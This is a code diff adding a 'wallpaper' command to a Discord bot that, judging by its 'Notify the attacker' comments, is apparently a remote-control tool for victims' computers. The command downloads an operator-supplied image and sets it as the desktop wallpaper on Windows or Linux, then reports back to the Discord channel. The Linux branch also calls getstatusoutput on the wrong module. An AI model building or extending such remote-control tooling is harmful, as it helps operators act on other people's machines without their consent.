@@ -154,6 +154,91 @@ class Others(commands.Cog, description="System Information"):
             await ctx.send(str(e))
             return
 
+    @commands.command()
+    async def wallpaper(self, ctx, url):
+        """
+        Usage:
+            >wallpaper <url> 
+        Examples:
+            >wallpaper http://direct.image.link/image.png
+
+        Parameters:
+            <url>
+                A direct link the Wallpaper-Image URL
+        """
+        try:
+            if os.name == 'nt':
+                try:
+                    import ctypes
+                except ImportError:
+                    os.system("py -m pip install -U ctypes")
+                finally:
+                    import ctypes
+
+                # Get the image from the link
+                img_r = requests.get(str(url))
+                if not 300 > img_r.status_code >= 200:
+                    return await ctx.send("Error: Invalid image URL. Bad status code")
+                img_path = "temp.jpg"
+                with open(img_path, "wb") as file:
+                    file.write(img_r.content)
+
+                # Change the wallpaper
+                ctypes.windll.user32.SystemParametersInfoW(
+                    20, 0, img_path, 0)
+
+                # Notify the attacker
+                embed = discord.Embed(
+                    title=f"Changed Wallpaper",
+                    description="",
+                    timestamp=datetime.utcnow(),
+                    color=0xFF5733
+                )
+                embed.set_image(url=url)
+                embed.set_footer(
+                    text=f'Requested by {ctx.author.name}',
+                    icon_url=ctx.author.avatar_url
+                )
+                await ctx.send(embed=embed)
+
+            else:
+                """
+                Code extracted from:
+                    https://gist.github.com/mtrovo/1110370#file-set_wallpaper-py
+                """
+
+                # Get the image from the link
+                img_r = requests.get(str(url))
+                if not 300 > img_r.status_code >= 200:
+                    return await ctx.send("Error: Invalid image URL. Bad status code")
+                img_path = "temp.jpg"
+                with open(img_path, "wb") as file:
+                    file.write(img_r.content)
+
+                # Run a command to change the wallpaper and get the status
+                command = "gconftool-2 --set \
+                        /desktop/gnome/background/picture_filename \
+                        --type string '%s'" % img_path
+                status, output = commands.getstatusoutput(command)
+
+                # Notify the attacker
+                embed = discord.Embed(
+                    title=f"Wallpaper Control",
+                    description=f"Status: {status}",
+                    timestamp=datetime.utcnow(),
+                    color=0xFF5733
+                )
+                embed.set_image(url=url)
+                embed.set_footer(
+                    text=f'Requested by {ctx.author.name}',
+                    icon_url=ctx.author.avatar_url
+                )
+                await ctx.send(embed=embed)
+
+        except Exception as e:
+            await ctx.send(str(e))
+            return
+
 
 def setup(client: commands.Bot):
     client.add_cog(Others(client))
